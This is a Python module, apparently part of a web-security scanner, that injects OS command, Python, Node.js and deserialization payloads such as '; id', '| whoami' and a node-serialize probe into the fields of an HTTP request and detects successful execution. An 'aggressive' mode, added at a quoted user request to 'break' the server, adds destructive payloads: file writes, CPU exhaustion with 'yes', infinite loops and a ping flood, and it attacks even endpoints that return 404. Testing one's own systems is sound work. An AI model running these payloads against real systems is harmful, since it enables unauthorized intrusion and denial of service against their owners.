from typing import Any, Dict, List
import time
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # Baseline
    baseline = client.send(scenario.method, scenario.target, json_body={"ip": "127.0.0.1"})

    if baseline.status_code in [404, 405]:
        if scenario.config.get("aggressive"):
            print(f"    [AGGRESSIVE] FORCE-ATTACK: Ignoring status {baseline.status_code}. Injecting RCE payloads...")
        else:
            return {
                "scenario_id": scenario.id,
                "attack_type": "rce",
                "passed": True, 
                "skipped": True,
                "details": f"Endpoint returned {baseline.status_code}. Skipping attack."
            }
    
    payloads = [
        # OS Command Injection (Unix)
        "; id", 
        "| whoami",
        "$(id)",
        "`id`",
        
        # OS Command Injection (Windows)
        "& whoami",
        "| type C:\\Windows\\win.ini",
        
        # Python Injection (Pickle/Eval)
        "import os; os.system('id')",
        
        # Node.js Injection
        "require('child_process').exec('id')",
        
        # Node Deserialization (node-serialize RCE)
        {"tracker": "_$$ND_FUNC$$_function (){ return 'BP_SAFE_PROBE'; }()"}
    ]
    
    # Normalizing payloads: ensure objects are handled if they are not strings
    # (The loop below needs adjustment to handle dict payloads for JSON bodies)
    
    # DESTRUCTIVE / AGGRESSIVE RCE (User Requested: "Break the serve", "Write files")
    if scenario.config.get("aggressive"):
        print("    [!!!] INJECTING DESTRUCTIVE RCE PAYLOADS (Fork Bombs, File Writes)...")
        payloads.extend([
            # Write File (Proof of Write Access)
            "; echo 'BREAKPOINT_HACKED' > hacked.txt", 
            "| echo 'BREAKPOINT_HACKED' > C:\\hacked.txt",
             
            # Resource Exhaustion (CPU/Memory Stress)
            "; yes > /dev/null &",  # Unix CPU stress
            "import os; while True: pass", # Python infinite loop (Hang)
            "while(1){}", # Node infinite loop (Hang)
            
            # Recursive Deletion (Simulated Safe Destruction - targets temp/logs usually)
            # Note: Real rm -rf / is too dangerous even for this tool, let's stick to user intent of "Break" via exhaustion
            
            # Network Exhaustion via RCE
            "; ping -c 10000 127.0.0.1",
        ])
    fields = scenario.config.get("fields", ["ip", "host", "command"])
    issues = []
    leaked_data = [] 
    
    for field in fields:
        for p in payloads:
            # Handle Dict payloads (Direct JSON Injection)
            if isinstance(p, dict):
                 # Merge or set body
                 body = p
                 # If we want to target a specific field with this payload, it's tricky. 
                 # Usually deserialization replaces the whole object or a specific known field.
                 # Let's assume the payload IS the body content we want to test or a specific key.
                 # For safety, let's keep it simple: if dict, use as is.
            else:
                body = {"ip": "127.0.0.1"} 
                body[field] = f"127.0.0.1 {p}" 
            
            resp = client.send(scenario.method, scenario.target, json_body=body)

            suspicious = False
            reasons = []
            text = resp.text.lower()
            
            # Differential: Strings must NOT be in baseline
            # Linux Check
            if "uid=" in text and "gid=" in text:
                if "uid=" not in baseline.text.lower():
                    suspicious = True
                    reasons.append("Command Output: 'uid/gid'")
                    leaked_data.append(f"[+] SYSTEM COMPROMISED: 'HACKED' - Command Execution Confirmed\nSHELL OUTPUT: {resp.text.strip()[:100]}")
                
            # Windows Check (whoami or win.ini)
            if "nt authority" in text or "[extensions]" in text or "fonts" in text:
                if "nt authority" not in baseline.text.lower():
                    suspicious = True
                    reasons.append("Command Output: Windows (whoami/win.ini)")
                    leaked_data.append(f"SHELL OUTPUT: {resp.text.strip()[:100]}")
                    
            # Node Deserialization Check
            if "BP_SAFE_PROBE" in resp.text:
                suspicious = True
                reasons.append("Node.js Deserialization RCE Executed")
                leaked_data.append("Node RCE Confirmed: Code executed.")
            
            # 3. Crash / Exhaustion Detection
            # If status is 0 (Network Error) or 503/504, or time > 4.5s (implies loop worked)
            if resp.status_code in [0, 503, 504] or resp.elapsed_ms > 4500:
                # Confirm it wasn't a fluke - if baseline was fast and this is slow
                # Baseline is usually fast.
                if baseline.elapsed_ms < 1000:
                     suspicious = True
                     reasons.append(f"Server Crash/Hang Confirmed (DoS via RCE). Status: {resp.status_code}, Time: {resp.elapsed_ms:.0f}ms")
                
            if suspicious:
                issues.append(f"[CRITICAL] RCE Probability in '{field}': {', '.join(reasons)}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "rce",
        "passed": len(issues) == 0,
        "details": {
            "issues": issues,
            "leaked_data": list(set(leaked_data))
        }
    }
